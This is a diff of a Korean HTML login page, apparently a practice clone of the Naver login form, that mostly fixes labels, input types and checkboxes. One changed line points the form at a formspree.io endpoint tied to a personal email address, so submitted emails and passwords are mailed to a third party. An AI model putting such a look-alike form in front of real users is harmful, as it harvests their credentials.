@@ -19,23 +19,43 @@
         </header>
         <main class="main">
             <h2 class="a11yHidden">로그인</h2>
-            <Form action="#" class="loginForm">
+            <Form action="http://formspree.io/seulbinnim@gmail.com" method="POST" class="loginForm">
                 <fieldset>
                     <legend>로그인 폼</legend>
                     <div class="loginForm__container">
                         <div class="userEmail">
                             <div class="formControl">
-                                <label class="a11yHidden formControl__label" alt="ID">아이디</label>
+                                <label for="userEmail" class="a11yHidden formControl__label">아이디</label>
                                 <input class="formControl__input" type="email" id="userEmail" name="userEmail" required placeholder="이메일">
                             </div>
                             <span class="errerMessage">아이디는 이메일 형식이여야 합니다.</span>
                         </div>
                         <div class="userPassword">
                             <div class="formControl">
-                                <label class="a11yHidden formControl__label" alt="Password">비밀번호</label>
-                                <input class="formControl__input" type="email" id="userPassword" name="userPassword" required placeholder="비밀번호">
+                                <label for="userPassword" class="a11yHidden formControl__label">비밀번호</label>
+                                <input class="formControl__input" type="password" id="userPassword" name="userPassword" required placeholder="비밀번호">
                             </div>
                             <span class="errerMessage">비밀번호를 입력해주세요</span>
+                        </div>
+                        <div class="userSelectInfo">
+                            <div class="formControl loginState">
+                                <input type="checkbox" class="formControl__checkbox" name="loginState" id="loginState">
+                                <label for="loginState" class="formCotrol__label">
+                                    <span class="checkboxIr">
+                                        로그인 상태유지
+                                    </span>
+                                </label>
+                            </div>
+                            <a href="https://www.naver.com" class="ipSecurityLink" target="_blank" rel="noopener noreferrer">
+                                IP 보안
+                            </a>
+                            <div class="formControl ipSecurity">
+                                <input type="checkbox" class="formControl__checkbox" name="ipSecurity" id="ipSecurity">
+                                <label for="ipSecurity" class="formControl__label ipSecurityLabel"></label>
+                            </div>
+                        </div>
+                        <div class="formControl">
+                            <button type="submit" class="form_Control__button buttonLogin">로그인</button>
                         </div>
                     </div>
                 </fieldset>
